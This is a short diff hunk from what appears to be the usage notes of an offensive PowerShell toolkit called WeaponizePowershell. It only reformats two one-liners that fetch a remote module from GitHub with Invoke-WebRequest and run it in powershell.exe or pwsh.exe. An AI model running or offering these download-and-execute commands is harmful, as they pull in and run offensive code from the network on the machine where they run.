@@ -8,7 +8,10 @@
 
 # -------------------------------------Execution------------------------------------------------
   (not yet working)
-  Powershell 3+ one liner execute:    powershell.exe (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
-  Powershell Core one liner execute:  pwsh.exe (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
+  
+  Powershell 3+ one liner execute:    
+    powershell.exe (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
+  Powershell Core one liner execute:  
+    pwsh.exe (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
   
 
